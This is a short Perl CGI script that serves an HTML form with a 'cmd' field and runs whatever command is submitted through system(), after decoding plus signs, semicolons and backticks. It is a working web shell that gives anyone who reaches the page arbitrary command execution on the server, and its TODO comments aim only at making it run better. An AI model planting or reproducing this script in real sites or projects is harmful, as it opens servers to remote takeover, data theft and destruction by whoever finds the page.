#!/usr/bin/perl -0777

print << "MARK";
Content-type: text/html

<form method='POST' action=''>
<input type='text' name='cmd' size=80>
</form><pre>
MARK
;

# TODO: running this inside another shell (not sh/bash) might help?

$cmd = <STDIN>;
$cmd=~s/^cmd=//isg;

# TODO: url unencode in general?
$cmd=~s/\+/ /isg;
$cmd=~s/%3B/;/isg;
$cmd=~s/%60/`/isg;

print "Running: $cmd<p>";
system($cmd);
